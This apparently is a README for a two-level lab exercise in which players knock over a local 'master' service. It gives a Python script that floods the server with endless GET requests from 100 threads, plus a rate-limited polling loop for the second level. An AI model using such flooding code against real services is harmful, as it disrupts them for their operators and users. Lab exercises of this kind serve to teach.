# DDOS Attack

Players need to cooperate to throw down service running on the master machine.

## Level One - Simple DDOS

ENV variables:

- `L1_PORT` - port to run the server on
- `L1_MAX_REQUESTS_PER_SECOND` - maximum number of requests per second, if not specified then the server will run until
  somebody actually throw it down, if specified then the server will be killed if `L1_MAX_REQUESTS_PER_SECOND` will be
  send in a second

### Solution

```python
import requests
import threading


def send_get_request():
    while True:
        requests.get('http://master:8080')


def main():
    # Create multiple threads to send GET requests concurrently
    for _ in range(100):
        thread = threading.Thread(target=send_get_request)
        thread.start()


if __name__ == '__main__':
    main()
```

## Level Two - IP limiting

### Solution

```python
import requests
import time


if __name__ == "__main__":
    while True:
        response = requests.get("http://master:8081")
        print(response.text)
        time.sleep(0.25)
```

